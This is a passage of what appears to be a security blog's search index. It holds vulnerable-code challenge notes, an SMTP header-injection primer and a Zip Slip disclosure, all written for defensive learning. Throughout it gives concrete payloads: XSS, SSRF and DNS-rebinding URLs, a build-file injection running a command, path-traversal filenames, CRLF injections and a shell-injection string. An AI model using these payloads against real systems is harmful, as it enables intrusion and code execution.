}});srv.start();comment.xslt:&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;&lt;xsl:stylesheet version=\"1.0\"                xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\"&gt;    &lt;xsl:output method=\"html\" /&gt;    &lt;!-- Allow the following tags: &lt;b&gt;, &lt;i&gt; and &lt;u&gt; --&gt;    &lt;xsl:template match=\"//b | //i | //u\"&gt;        &lt;xsl:element name=\"{local-name()}\"&gt;            &lt;xsl:value-of select=\".\"/&gt;        &lt;/xsl:element&gt;    &lt;/xsl:template&gt;    &lt;!-- Allow links to https://example.com --&gt;    &lt;xsl:template match=\"//*[@href]\"&gt;        &lt;xsl:element name=\"{local-name()}\"&gt;            &lt;xsl:attribute name=\"href\"&gt;                &lt;xsl:choose&gt;                    &lt;xsl:when test=\"starts-with(@href, 'https://example.com/')\"&gt;                        &lt;xsl:value-of select=\"@href\"/&gt;                    &lt;/xsl:when&gt;                    &lt;xsl:otherwise&gt;/&lt;/xsl:otherwise&gt;                &lt;/xsl:choose&gt;            &lt;/xsl:attribute&gt;            &lt;xsl:value-of select=\".\"/&gt;        &lt;/xsl:element&gt;    &lt;/xsl:template&gt;&lt;/xsl:stylesheet&gt;  User comments are converted to HTML using an XSLT template.  The XSLT filters HTML tags to prevent XSS.  Allowed tags: &lt;b&gt;, &lt;i&gt;, &lt;u&gt;, and links to https://example.org.  Links are allowed based on the href attribute, without tag name restriction.  This allows malicious script injection: &lt;script href=\"/\"&gt;alert(document.domain);&lt;/script&gt;.Day 18 - JavaScriptconst csrfProtect = require('csurf')({ cookie: true });app.use(session({    secret: process.env.SECRET,    cookie: {        secure: true,        sameSite: 'none',    },}));app.post('/upload', parseForm, csrfProtect, async (req, res) =&gt; {    const f = req.files.template;    if (path.extname(f.name) !== '.txt') {        return res.status(400).send();    }    const id = uuid.v4();    await f.mv(`public/uploads/${id}`);    return res.json({id});});app.get('/exportPDF', csrfProtect, async (req, res) =&gt; {    if (!req.query.id) {        return res.status(400).send();    }    const id = path.basename(req.query.id);    const dst = `public/export/${id}.pdf`;    const f = buildForm(`public/uploads/${id}`).replaceAll('{csrf_token}', req.csrfToken());    await fs.writeFile(dst, f);    return res.send(`&lt;a href=\"${escape(dst)}\"&gt;Your PDF!&lt;a&gt;`);});  The goal is to bypass CSRF protection and attack any endpoint.  The /exportPDF endpoint exports text files as PDF forms.  CSRF tokens are embedded in exported PDFs by replacing {csrf_token}.  CSRF middleware doesn’t protect GET requests, making /exportPDF vulnerable to CSRF.  Attackers need the file ID to trigger the export.  Attackers can upload files and trick other users into exporting them.  Exported PDFs contain the victim’s CSRF token.  Attackers can download the PDF, extract the token, and launch CSRF attacks on the victim’s behalf, performing privileged actions.Day 19 - Pythondef is_their_service_broken(url: str) -&gt; bool:    try:        host = requests.utils.urlparse(url).hostname        res = socket.gethostbyname(host)    except socket.gaierror:        return False    return not ipaddress.ip_address(res).is_private@app.route('/avatar/&lt;string:avatar&gt;')def fetch_avatar(avatar: str) -&gt; Response:    avatar = f'http://unstable-avatar-service.tld{avatar}'    # This service is still in development and their DNS sometimes    # point to their own internal network, make sure it's OK    if not is_their_service_broken(avatar):         hash = md5(avatar.encode(\"ascii\")).hexdigest()        avatar = f'http://www.gravatar.com/avatar/{hash}'    res = requests.get(avatar, stream=True, timeout=1)    return make_response(        stream_with_context(res),        res.status_code,        {'Content-Type': 'image/png'}    )  New feature introduces a Server-Side Request Forgery (SSRF) vulnerability.  Validation function blocks requests to private IPs, but has a race condition.            DNS lookup resolves hostname to public IP (accepted by validation).                  request.get() sends another DNS request (potential delay).                  During this delay, attacker can change IP to a private one (internal service).        Attacker exploits this timing gap by manipulating DNS records.  Example payload: http://challenge/avatar/:x@0a004a8c.01010101.rbndr.us:1234  This tricks the server into sending a request to the attacker-controlled internal service (10.0.74.140:1234).Challenge based on https://blog.sonarsource.com/wordpress-core-unauthenticated-blind-ssrf/Day 20 - CSharp// Start log server Socket socket = new Socket(    AddressFamily.InterNetwork,    SocketType.Dgram,    ProtocolType.Udp);socket.SetSocketOption(    SocketOptionLevel.IP,    SocketOptionName.ReuseAddress,    true);socket.Bind(new IPEndPoint(IPAddress.Parse(\"0.0.0.0\"), 1337));const int bufSize = 1024;byte[] buffer = new byte[bufSize];EndPoint epFrom = new IPEndPoint(IPAddress.Any, 0);AsyncCallback recv = null;socket.BeginReceiveFrom(buffer, 0, bufSize, SocketFlags.None, ref epFrom, recv = (ar) =&gt;{    int receivedBytes = socket.EndReceiveFrom(ar, ref epFrom);    IPEndPoint src = epFrom as IPEndPoint;    if (IsInRange(src.Address, \"10.13.37.0/24\"))    {        ConsumeLogMessage(epFrom, buffer, receivedBytes);    }    socket.BeginReceiveFrom(buffer, 0, bufSize, SocketFlags.None, ref epFrom, recv, buffer);}, buffer);  UDP socket is opened on port 1337 to receive log messages.  A callback function processes incoming UDP packets.  Packet validation checks if the source IP is within the 10.13.37.0/24 range.  UDP lacks strong security mechanisms like TCP’s handshake.  Attackers can spoof source IP addresses using tools like Scapy.  While internet ISPs often filter spoofed packets, some shady hosting providers allow it.  IP-based access control should consider this vulnerability.Day 21 - JavaMemcachedConnector mcc = new MemcachedConnector(\"memcached\", 11211);mcc.set(\"welcome_en\", \"Hi there!\");mcc.set(\"welcome_de\", \"Hallo!\");mcc.set(\"welcome_fr\", \"Bonjour!\");mcc.set(\"auth_backend\", \"http://192.168.64.2:8000/\");HttpServer srv = HttpServer.create(new InetSocketAddress(9000), 0);srv.createContext(\"/\", (HttpExchange he) -&gt; {    String lang = \"en\";    if (he.getRequestURI().getQuery() != null) {        for (String param : he.getRequestURI().getQuery().split(\"&amp;\")) {            String[] entry = param.split(\"=\");            if (entry[0].equals(\"lang\")) lang = entry[1];        }    }    String welcomeMessage = mcc.get(\"welcome_\" + lang);    Main.response(he, 200, welcomeMessage);});srv.createContext(\"/login\", (HttpExchange he) -&gt; {    try {        JSONParser jsonParser = new JSONParser();        JSONObject jsonObject = (JSONObject)jsonParser.parse(new InputStreamReader(he.getRequestBody(), \"UTF-8\"));        String authBackend = mcc.get(\"auth_backend\");        String body = \"username=\" + jsonObject.get(\"username\") + \"&amp;password=\" + jsonObject.get(\"password\");        HttpClient httpClient = HttpClient.newHttpClient();        HttpRequest req = HttpRequest.newBuilder().uri(URI.create(authBackend))                                     .POST(HttpRequest.BodyPublishers.ofString(body))                                     .headers(\"Content-Type\", \"application/x-www-form-urlencoded\").build();        HttpResponse&lt;String&gt; resp = httpClient.send(req, HttpResponse.BodyHandlers.ofString());        if (resp.statusCode() == 200) {            Main.response(he, 200, \"Welcome!\\n\");            return;        }    } catch (Exception exp) { }    Main.response(he, 403, \"Login failed!\\n\");});srv.start();  The application uses memcached to store localized welcome messages.  The lang query parameter is directly inserted into the memcached query.  By injecting newline characters (\\r\\n), attackers can append additional memcached commands.  Attackers can manipulate the auth_backend key to redirect user credentials to a malicious server.  This vulnerability is similar to a real-world Zimbra vulnerability.Challenge based on https://blog.sonarsource.com/zimbra-mail-stealing-clear-text-credentials-via-memcache-injection/Day 22 - CSharp[HttpPost]public string DummyBuild(){    // note: users can create files and subdirs in their project dir    string src = GetCurrentUserProjectDir();    var sources = Directory.GetFiles(src, \"*.cs\", SearchOption.AllDirectories)                           .ToList()                           .Select(x =&gt; @$\"&lt;None Include=\"\"{x}\"\" /&gt;\");    string tmpDir = CreateTmpDir();    System.IO.File.WriteAllText(Path.Combine(tmpDir, \"app.csproj\"), $@\"&lt;Project Sdk=\"\"Microsoft.NET.Sdk\"\"&gt;&lt;PropertyGroup&gt;&lt;TargetFramework&gt;net6.0&lt;/TargetFramework&gt;&lt;/PropertyGroup&gt;&lt;ItemGroup&gt;{string.Join(Environment.NewLine, sources)}&lt;/ItemGroup&gt;&lt;/Project&gt;\");    var process = new System.Diagnostics.Process();    process.StartInfo = new System.Diagnostics.ProcessStartInfo    {        WorkingDirectory = tmpDir,        FileName = \"dotnet\",        Arguments = \"build\",        RedirectStandardOutput = true,    };    process.Start();    var output = process.StandardOutput.ReadToEnd();    process.WaitForExit();    CleanUp(tmpDir);    return output;}  DummyBuild() function creates an XML project file based on user-provided file paths.  These paths are inserted into the template without escaping special characters (“, &lt;, &gt;).  Attackers can craft paths containing these characters to inject XML elements.  The generated file is used as a .NET project file with dotnet build.  An attacker can create a &lt;Target&gt; with an &lt;Exec&gt; command for arbitrary code execution.  Example path: \"/&gt;&lt;/ItemGroup&gt;&lt;Target Name=\"Pwn\" BeforeTargets=\"Build\"&gt;&lt;Exec Command=\"id\"/&gt;&lt;/Target&gt;&lt;ItemGroup&gt;&lt;None Include=\"/tmp/foo.cs  This creates a malicious project file structure with an embedded “id” command.  dotnet build executes the attacker-defined “Pwn” target before building, running the “id” command.Day 23 - C// I found this URL parser on stackoverflow, it should be good enoughbool validate_domain(const char *url) {    char domain[100];    int port = 80;    sscanf(url, \"https://%99[^:]:%99d/\", domain, &amp;port);    return strcmp(\"internal.service\", domain) == 0;}int main(int argc, char **argv) {  // [...]  const char *url = argv[1];  if (!validate_domain(url)) {    printf(\"validate_domain failed\\n\");    return 1;  }  if ((curl = curl_easy_init())) {    curl_easy_setopt(curl, CURLOPT_URL, url);    res = curl_easy_perform(curl);     switch(res) {    case CURLE_OK:        printf(\"All good!\\n\");        break;    default:        printf(\"Nope :(\\n\");        break;    }  }  // [...]}  The validate_domain() function uses a simplified URL parsing approach.  This approach differs from standards like RFC 2396 and RFC 3986.  Libraries like libcurl implement more comprehensive URL parsing.  This discrepancy can lead to different interpretations of the same URL.  This is known as a URL parsing differential.  Attackers can exploit this by crafting malicious URLs that target unintended hosts.  Example: https://internal.service:@very-sensitive-internal.service/Day 24 - PHPdefine('UPLOAD_FOLDER',       sys_get_temp_dir().DIRECTORY_SEPARATOR.'uploads'.DIRECTORY_SEPARATOR);function validateFilePath($fpath) {  // Prevent path traversal  if (str_contains($fpath, '..'.DIRECTORY_SEPARATOR)) {    http_response_code(403);    die('invalid path!');  }}function uploadFile($src, $dest) {  $path = dirname($dest);  if (!file_exists($path)) {    mkdir($path, 0755, true);  }  move_uploaded_file($src, $dest);}function normalizeFilePath($fpath) {  if (strpos($_SERVER['HTTP_USER_AGENT'], 'Windows')) {    return str_replace('\\\\', '/', $fpath);  }  return $fpath;}$src  = $_FILES['file']['tmp_name'];$dest = UPLOAD_FOLDER.$_FILES['file']['full_path'];validateFilePath($dest);uploadFile($src, normalizeFilePath($dest));echo 'file uploaded!';  The application allows users to upload arbitrary files.  The destination path is constructed by concatenating the base path with the user-provided filename.  A basic check is done to prevent ../ in the filename to avoid path traversal.  However, the normalization process converts backslashes (\\) to forward slashes (/) on Windows systems.  Attackers can exploit this by using \\.. in the filename and setting a Windows User-Agent.  This bypasses the ../ check and allows path traversal to arbitrary locations.  An attacker can upload a malicious PHP file to the web root, enabling remote code execution.This challenge is based from https://blog.sonarsource.com/zimbra-pre-auth-rce-via-unrar-0day/"
  },
  
  {
    "title": "Avoiding SMTP Injection: A Whitebox primer",
    "url": "/posts/avoiding-smtp-injection/",
    "categories": "software security",
    "tags": "smtp injection",
    "date": "2022-09-13 03:25:52 +0800",
    





    
    "snippet": "SMTP Injection can often be interesting vulnerability to code review and find. Some work I did regarding this can be found here: https://snyk.io/blog/avoiding-smtp-injection/The following vulnerabi...",
    "content": "SMTP Injection can often be interesting vulnerability to code review and find. Some work I did regarding this can be found here: https://snyk.io/blog/avoiding-smtp-injection/The following vulnerabilities were found during this research            Library      Language      Fixed Version                  SMTPMail-drogon      C      Fixed in Master              Email::MIME      Perl      No Fix Available              Net::SMTP      Perl      No Fix Available              aiosmtplib      Python      Fixed in 1.1.7              smtpclient      NodeJS      No Fix Available      The below are some of my notes/payloads from this researchsmtp-clientIn the example below, I can inject \\r\\n into an rcpt object and add a EHLO command. Other fields within Email such as Subject and From field are also vulnerable.var smtp = require('smtp-client');let s = new smtp.SMTPClient({  host: '127.0.0.1',  port: 1225});(async function() {  await s.connect();  await s.greet({hostname: '127.0.0.1'}); // runs EHLO command or HELO as a fallback  await s.authPlain({username: 'testuser', password: 'testpass'}); // authenticates a user  await s.mail({from: 'from@sender.com'}); // runs MAIL FROM command  await s.rcpt({to: 'to@recipient.com&gt;\\r\\nEHLO client.example.com'}); // runs RCPT TO command (run this multiple times to add more recii)  await s.data('mail source'); // runs DATA command and streams email source  await s.quit(); // runs QUIT command})().catch(console.error);to@recipient.com&gt;\\r\\nEHLO client.example.com - This command being treated as a separate command can be seen below.Email::MIMEThe below example just shows an example of CRLF sequences being processed and sent successfully as a CC header#!/usr/bin/perluse MIME::Lite;#$cc = 'cc@example.com';$from = \"sender\\@outlook.com\";$to = \"reciever\\@gmail.com\\rCc: zercool\\@gmail.com\";$subject = \"Hello world\";$message = 'This is test email sent by Perl Script';$msg = MIME::Lite-&gt;new(  From     =&gt; $from,  To       =&gt; $to,  Cc       =&gt; $cc,  Subject  =&gt; $subject,  Type     =&gt; 'multipart/mixed');# Add your text message.$msg-&gt;attach(Type =&gt; 'text', Data =&gt; $message);# config$msg-&gt;send('smtp', \"localhost\", Port=&gt;2025, Hello=&gt;\"localhost\" );print \"Email Sent Successfully\\n\";I have an example python server running locally with python -m smtpd -c DebuggingServer -n localhost:2025 and the injected Cc header can be seen below.he below example just shows an example of CRLF sequences being processed and sent successfully as a CC headerNet::SMTP#!/usr/bin/perluse strict;use Cwd;use Data::Dumper;use Net::SMTP;use File::Slurp;use Email::Sender::Simple qw(sendmail);sub sendMail($$);use constant DEBUG =&gt; 0;my $startDir = getcwd;my %email = ( 'smtp' =&gt; 'smtp.mailtrap.io',              'hello' =&gt; 'smtp.mailtrap.io',              'user'   =&gt; '63ef4bad307846',              'pass'   =&gt; '650425530e71d1',              'no_mail' =&gt; 0,  # Don't send mail. Useful for checking what would be sent...              'debug' =&gt; 1,    # Print extra smtp feedback.              'from' =&gt; \"from\\@example.com\",              'to' =&gt; [ \"to\\@example.com\\r\\nCc: foobar\\@gmail.com\" ],              'subject' =&gt; 'Testing' );my $bodyfile = $ARGV[0];unless (-f $bodyfile){  die \"usage: $0 &lt;file_containing_email_body&gt;\";}my $mail_body = \"Hey\";print \"sending mail...\\n\"  if(DEBUG);sendMail(\\%email, $mail_body);exit 0;sub sendMail($$){  my $m = shift;  my $out  = shift;  my $toList = join ',', @{ $m-&gt;{'to'} };  if( $m-&gt;{'no_mail'} ){    print \"sendMail(no_mail=1): NOT sending\\n\" . Dumper($m) . \"\\n\" . Dumper($out) . \"\\n\";    return;  }  my $smtp = Net::SMTP-&gt;new( $m-&gt;{'smtp'}, 'Hello' =&gt; $m-&gt;{'hello'},                              'Debug' =&gt; $m-&gt;{'debug'}, 'Port' =&gt; 2525 );  $smtp-&gt;auth(  $m-&gt;{'user'}, $m-&gt;{'pass'} );  $smtp-&gt;mail( $m-&gt;{'from'} );  $smtp-&gt;to( @{ $m-&gt;{'to'} } );  $smtp-&gt;data();  $smtp-&gt;datasend(\"From: $m-&gt;{'from'}\\n\" );  $smtp-&gt;datasend(\"To: $toList\\n\" );  $smtp-&gt;datasend(\"Subject: $m-&gt;{'subject'}\\n\" );  $smtp-&gt;datasend(\"\\n\");  $smtp-&gt;datasend( \"$out\\n\" );  $smtp-&gt;dataend();  $smtp-&gt;quit;}Here the \\r\\nCc: foobar\\@gmail.com will be interpreted as a separate command and an extra Cc header will be injected through the To header.Net::SMTP=GLOB(0x5578f2cfc148)&gt;&gt;&gt; From: from@example.comNet::SMTP=GLOB(0x5578f2cfc148)&gt;&gt;&gt; To: to@example.comNet::SMTP=GLOB(0x5578f2cfc148)&gt;&gt;&gt; Cc: foobar@gmail.comMitigationOne potential fix here is to escape newlines, e.g.  \\n -&gt; \\n \\r -&gt; \\r specifically in address and subject fields. Another option is to validate and not allow CRLF characters at all. Here are some examples of popular email libraries fixing this issue.      RubyMail        PHPMailer        smtpmail drogon  "
  },
  
  {
    "title": "Improving GraphQL security with static analysis",
    "url": "/posts/improving-graphql-security-with-static-analysis/",
    "categories": "software security",
    "tags": "graphql",
    "date": "2022-04-13 03:25:52 +0800",
    





    
    "snippet": "GraphQL frameworks can often be interesting to code review, and often most static analysis tools don’t support them. Some work I did regarding this can be found here: https://snyk.io/blog/graphql-s...",
    "content": "GraphQL frameworks can often be interesting to code review, and often most static analysis tools don’t support them. Some work I did regarding this can be found here: https://snyk.io/blog/graphql-security-static-analysis-snyk-code/"
  },
  
  {
    "title": "rs-async-zip Zip Path Traversal (Zip Slip)",
    "url": "/posts/rs-async-zipslip/",
    "categories": "software security",
    "tags": "rust, zip slip",
    "date": "2022-03-09 03:25:52 +0800",
    





    
    "snippet": "Introductionrs-async-zip is a asynchronous ZIP archive reading/writing crate with a heavy focus on streaming support. This package is vulnerable to Zip Traversal (Zip Slip).Note: This issue was pri...",
    "content": "Introductionrs-async-zip is a asynchronous ZIP archive reading/writing crate with a heavy focus on streaming support. This package is vulnerable to Zip Traversal (Zip Slip).Note: This issue was privately disclosed to the maintainer. He has stated that he has made conscious decision not to mitigate any sort of traversal attacks within the library itself. He has however added a notice to to the example code https://github.com/Majored/rs-async-zip/commit/08587b8933f80f8a70b4e313313f2fffc22c983a. This was also further discussed here https://github.com/rustsec/advisory-db/pull/1141ZIP Traversal Attacks is a form of a Directory Traversal that can be exploited by extracting files from an archive. More about this type of vulnerability can be read about here: https://snyk.io/research/zip-slip-vulnerabilityPoC/Steps to Reproduce  1) Download the Zip file which contains a file called ../../../../../../../tmp/test.txt (Download link: https://github.com/snoopysecurity/Public/blob/master/payloads/shell.zip)  2) Run the below code and provide the path to shell.zipse std::path::Path;use std::sync::Arc;use async_zip::read::fs::ZipFileReader;use tokio::fs::File;#[tokio::main]async fn main() {    let zip = Arc::new(ZipFileReader::new(\"/home/snoopy/shell.zip\").await.unwrap());    println!(\"Extracting Archive\");    let mut handles = Vec::with_capacity(zip.entries().len());    for (index, entry) in zip.entries().iter().enumerate() {        if entry.dir() {            continue;        }        let local_zip = zip.clone();        handles.push(tokio::spawn(async move {            let reader = local_zip.entry_reader(index).await.unwrap();            let path_str = format!(\"./output/{}\", reader.entry().name());            let path = Path::new(&amp;path_str);            tokio::fs::create_dir_all(path.parent().unwrap()).await.unwrap();            let mut output = File::create(path).await.unwrap();            reader.copy_to_end_crc(&amp;mut output, 65536).await.unwrap();        }));    }        for handle in handles {        handle.await.unwrap();    }}"
  },
  
  {
    "title": "SonarSource CodeAdvent Security Calendar 2021 Notes",
    "url": "/posts/code-advent-2021-security-challenges/",
    "categories": "capture the flag",
    "tags": "ctf",
    "date": "2022-01-02 03:25:52 +0800",
    





    
    "snippet": "Notes related to RipsTech/SonarSource CodeAdvent Security Calendar 2021.Day 1      Line 13: The code registers a handler for message events and writes the event’s data directly into the DOM.       ...",
    "content": "Notes related to RipsTech/SonarSource CodeAdvent Security Calendar 2021.Day 1      Line 13: The code registers a handler for message events and writes the event’s data directly into the DOM.        Vulnerability: This approach poses a security risk. Malicious websites can embed this page and send a message containing malicious code (XSS payload) that gets executed by the handler.  This challenge is based on Ghost CMS: https://www.sonarsource.com/blog/ghost-admin-takeover/Day 2      Security Issue: The code uses os.path.join to combine user-provided data (img parameter) with a fixed path.        Vulnerability in os.path.join: According to the documentation, if any path segment in os.path.join starts with a forward slash (/), it’s treated as an absolute path, discarding everything before it.        Exploitation: A malicious user could send a request with img set to /etc/passwd. This absolute path would bypass the intended path construction and potentially allow access to the system’s password file!  This challenge is based on https://www.sonarsource.com/blog/10-unknown-security-pitfalls-for-python/Day 3      Missing Security Check: The code lacks a check for the .phar extension, which is often interpreted as PHP by default Apache configurations.        Inherent Risk of Extension Blocklists: As discussed in our blog post about elFinder vulnerabilities, extension blocklists are often unreliable and can be bypassed.  This challenge is based on https://www.sonarsource.com/blog/elfinder-case-study-of-web-file-manager-vulnerabilities/Day 4      Missing Content-Type Header: Files are stored without extensions, causing Apache to omit a Content-Type header in the response.        Browser Misinterpretation: Modern browsers often interpret files without a specified content type as HTML, leading to a potential Stored Cross-Site Scripting (XSS) vulnerability.  Day 5Hint Given: PATH is ignored by execl, but several bug hunters already found that the command could be executed from the current working directory. Speaking of environment variables, can you think of another interesting one?  Insecure Environment Inheritance: The execl() function on line 16 inherits the environment variables from the parent process.  Potential for Privilege Escalation: Malicious actors could exploit this by setting environment variables like MODPROBE_OPTIONS to load arbitrary kernel modules, potentially leading to privilege escalation.  Mitigation: Always provide a clean environment to execl() to prevent unintended consequences.Day 6  Vulnerable Bash Expansion: The code is susceptible to manipulation through bash expansion within the tar command. Example: An attacker could create a file named \"-I touch shell\" in the /opt/webapp directory. When executed by tar, the -I touch shell argument would be interpreted, potentially creating a file named “shell”.  Alternative Attack Methods: --checkpoint-action Argument: Replies suggest exploiting the --checkpoint-action argument for similar malicious purposes.  Filename Manipulation: Uploading filenames containing special characters like ; (semicolon) could also allow command injection.  Zip Slip Vulnerability: The vulnerability extends to potential Zip Slip attacks on the .tar archive format. Uploading a file with a specially crafted directory traversal path (e.g., ../../evil.sh) could lead to the extraction of malicious code outside the intended directory and its subsequent execution.Day 7  DNS Rebinding Vulnerability: The code’s reliance on two separate DNS queries, first with Dns.GetHostEntry() and then with WebRequest, creates an opportunity for DNS rebinding attacks.  Attack Scenario: A malicious actor could exploit this by manipulating DNS responses to redirect the second WebRequest to a malicious server, even if the initial DNS query was validated against an allowlist.  Mitigation: To prevent this, always use the IP address obtained from the initial DNS query, rather than relying on a subsequent DNS lookup. This ensures that the request is sent to the intended server.Day 8  Buffer Overflow Vulnerability: The server code on line 13 reads 16 bytes into a buffer without validating for null termination.  Data Exposure Risk: An attacker can exploit this vulnerability by sending a 16-byte input that doesn’t end with a null byte. This can cause the server to read and return additional data from adjacent memory locations, potentially including sensitive information.  Mitigation: The server code should strictly enforce input validation and bounds checking to prevent buffer overflows. This can be achieved by ensuring that the input data is properly null-terminated or by limiting the number of bytes read to a safe maximum.Day 9  The regex at line 7 is correct in itself as it checks for the right characters.  The bug lies in the g flag:          It makes the regex object retain the last match index.      It will continue after that index when .test() is called again.        Attackers could still use quotes and perform SQL injection by sending their request two times in a row:          The second regex check will start after the quote.      Day 10  Vulnerability at line 9: Email address converted to uppercase before SQL query.          Issue: Unicode characters can map to the same uppercase version, causing different emails to appear identical.        Potential Attack:          Send password reset to a different email with a similar-looking address.      Example:                  Original email: foo@mix.com          Attacker email (using a similar-looking Unicode character): foo@mıhttp://x.com/ (appears as FOO@MIX.com after uppercase conversion)                    Consequence: Account takeover if successful.      Day 11  Issue with isPrivileged() function:          Always returns true due to the way integer casting to enums works.      Casting an integer to an enum never throws an exception, even if the integer doesn’t correspond to a defined enum member.        Solution:          Use PrivRoles.IsDefined((PrivRoles) role) to correctly check if the role is a defined enum value.      Day 12  Issue: External entity loading can be accidentally re-enabled in PHP 8.          Even with default settings, using LIBXML_NOENT can lead to unintended consequences.      LIBXML_NOENT does not disable external entity loading.      This challenge is based from https://www.sonarsource.com/blog/wordpress-xxe-security-vulnerability/Day 13Hint from SonarSource: There is a small typo in the challenge, please read filename.endsWith(“.xml”) instead of !filename.endsWith(“xml”); good catch @c4mxPwn  Vulnerability: Filename truncation and ineffective input sanitization.          Filenames are limited to 60 characters, bypassing extension checks with long filenames.      The .replace() function is used but its result is not assigned, making it ineffective.        Potential Attack:          Upload a malicious file with a long filename and a dangerous extension (e.g., .php).      The filename will be truncated, but the server might still process the file based on its actual content.      This challenge is based from https://www.sonarsource.com/blog/mybb-stored-xss-to-rce/Day 14  Vulnerability: ToCToU race condition in file access.          Checks for file existence can be bypassed by creating a symlink before the file is opened.        Potential Attack:          Attacker creates a symlink to a different file or directory. e.g. /tmp/logs.txt right before the call to fopen()      The application opens the symlink, leading to unintended file operations.        Mitigation Strategies:          Use restrictive file permissions to limit access to sensitive directories.      Employ file descriptors instead of paths for operations like fstat to reduce the window for race conditions.      Day 15  Vulnerability: Prototype Pollution in line 12 (ejs templating engine).          When type is set to \"__proto__\" and id and content are provided, it allows modification of Object.prototype.      This can affect all existing and newly created objects, leading to unintended behavior.        Example (Kibana vulnerability): https://research.securitum.com/prototype-pollution-rce-kibana-cve-2019-7609/  Mitigation:          Use Object.create(null) to create new objects without inherited attributes.        Challenge: Discover a payload leading to code execution in recent ejs versions.  Potential Attack (Solution by @jorge_ctf):          Set type to \"__proto__\".      Set id to \"client\" (truthy value).      Set content to a JavaScript payload that will be executed during template rendering.      Day 16  Vulnerability: Unreliable assertion in user deletion logic.          assert statements are ignored in optimized Python code (PYTHONOPTIMIZE, -O).        Impact:          Any user can delete other users, bypassing authorization checks.        Mitigation:          Replace assert with a robust authorization check that is always executed, regardless of optimization flags.      Consider using a more secure language or framework that enforces strong security principles.      Day 17  Vulnerability: Unsanitized object deserialization in PHP.          PHP supports two serialization formats (O: and C:).      The C: format is not properly handled by the blocklist.        Potential Impact:          Arbitrary object deserialization could lead to various security issues, including remote code execution (RCE) under specific conditions.        Mitigation:          Implement strict input validation and filtering for serialized data.      Consider using a more secure serialization format or library that provides better protection against vulnerabilities.      Regularly update PHP and frameworks to address known vulnerabilities.      Day 18  Vulnerability: Command Injection via FastJSON Deserialization.          FastJSON invokes setters of deserialized objects during parsing.      Malicious JSON data can trigger command execution through vulnerable setters.        Attack Vector:          Crafting a specific JSON payload to exploit the CSRFToken class’s behavior.      Leveraging the chain of object instantiation and method calls to execute arbitrary commands.        Mitigation:          Avoid using vulnerable libraries like FastJSON.      Implement strict input validation and sanitization for all deserialized data.      Consider using safer deserialization libraries or frameworks that provide protection against such attacks.      Day 19  Vulnerability: Missing Signature Verification in JWT Processing.          The code at line 10 processes the JWT token but fails to verify its digital signature.        Impact:          Attackers can forge valid-looking JWT tokens without the correct secret key.      This allows unauthorized users to impersonate legitimate users and gain access to protected resources.        Mitigation:          Implement robust JWT signature verification using the appropriate secret key.      Ensure that the verification process is performed before granting user access.      Consider additional security measures like token expiration, revocation, and rate limiting to further enhance protection.      Challenge based on https://rules.sonarsource.com/python/RSPEC-5659/Day 20  Windows Execution Context:          When a command is executed by name (e.g., img-converter) on Windows, the OS searches for the executable in the following order:                  Current directory          System PATH                      Exploit Scenario:          An attacker can upload a malicious file named img-converter.exe to the target directory.      When the application attempts to execute the img-converter command within this directory, the malicious executable is executed instead of the legitimate one.        Potential Impact:          Remote Code Execution (RCE): The malicious code within the uploaded file can gain control over the system, allowing the attacker to execute arbitrary commands.      Day 21  Path Traversal Sanitization:          The application sanitizes file paths to prevent Path Traversal attacks.      The sanitization process removes two consecutive dots (..) from the filename.      However, backslashes () are removed from the filename after this step.        Exploit Scenario:          An attacker can craft a malicious filename like .\\./.\\.shell.jsp.      After sanitization, the filename becomes ../../shell.jsp.      This allows the attacker to access files outside the intended directory.        Potential Impact:          File Access and Manipulation: The attacker can read, write, or delete files on the server.      Remote Code Execution (RCE): If the server allows the execution of certain file types (e.g., JSP), the attacker could upload a malicious script and execute it remotely.      Day 22  SQL Injection:          The application uses the addslashes() function to sanitize user input.      However, the sanitized input is not enclosed in quotes when inserted into the SQL query.      This allows attackers to inject malicious SQL code.        Shell Injection:          The application executes external shell commands using the user-provided input.      The input is not properly escaped, making it vulnerable to shell injection attacks.        Exploit Scenario:          An attacker can craft a payload like 1--$(id&gt;foo):                  The addslashes() function will sanitize the input but won’t prevent SQL injection due to the lack of quotes.          The shell command will execute the malicious payload, leading to RCE.                      Potential Impact:          Database Compromise: Attackers can access, modify, or delete sensitive data.      Remote Code Execution (RCE): Attackers can gain control over the server and execute arbitrary commands.      Day 23  Format String Vulnerability:          The syslog() function in C is designed to log messages with formatted strings.      However, the second argument in this case is not a format string but rather arbitrary user-controlled input.      This can lead to format string vulnerabilities, allowing attackers to exploit the function’s behavior to execute arbitrary code or read sensitive memory.        Compiler Warnings:          While some compilers (like GCC with the -Wformat-security flag) can detect potential format string vulnerabilities, this may not be the case for all compilers or libraries used in the project.        Potential Impact:          Remote Code Execution (RCE): Attackers can exploit the vulnerability to execute arbitrary code on the system.      Information Disclosure: Attackers can read sensitive memory contents, including passwords, encryption keys, or other confidential data.      Challenge based from https://www.youtube.com/watch?v=MBz5C9Wa6KMDay 24Vulnerability Description:  SSRF via Java URI.resolve() and OkHttp          Component: Java URI.resolve() method      Behavior: This method returns its parameter unchanged if it’s already an absolute URL.      Exploit:                  An attacker can provide a crafted URL like http:/example.com#.          URI.resolve() will treat it as an absolute URL due to the leading protocol scheme (http:) and fragment (#).                    Vulnerable Library: OkHttp library accepts the crafted URL when making the request.        Potential Impact:          Server-Side Request Forgery (SSRF): The attacker can trick the application into making unauthorized requests to internal servers or external resources.      Depending on the application’s configuration and permissions, this could allow attackers to:                  Leak sensitive information from internal systems.          Perform Denial-of-Service (DoS) attacks on internal or external resources.          Execute arbitrary code on the server (if the server allows code execution from the requested resource).                    "
  },
  
  {
    "title": "Joern Cheat Sheet",
    "url": "/posts/joern-cheat-sheet/",
    "categories": "software security, static analysis",
    "tags": "joern",
    "date": "2021-12-09 03:25:52 +0800",
    





    
    "snippet": "Joern NotesJoern is a static analyzer that can be used to create code property graphs and query them fairly easy. This is good alternative to CodeQL since analyzing with Joern doesn’t require you t...",
